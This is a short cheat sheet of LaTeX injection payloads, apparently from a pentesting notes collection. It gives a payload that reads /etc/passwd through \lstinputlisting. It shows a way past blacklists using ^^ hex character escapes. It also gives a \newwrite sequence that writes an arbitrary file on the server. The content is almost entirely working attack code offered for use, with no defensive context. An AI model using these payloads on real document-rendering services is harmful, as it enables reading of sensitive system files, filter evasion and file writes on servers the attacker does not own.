## read file

```tex
\lstinputlisting{/etc/passwd}
```

## bypass blacklist

To bypass blacklists try to replace one character with it's unicode hex value. 
- ^^41 represents a capital A
- ^^7e represents a tilde (~) note that the ‘e’ must be lower case

```tex
\lstin^^70utlisting{/etc/passwd}
```

## write file

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```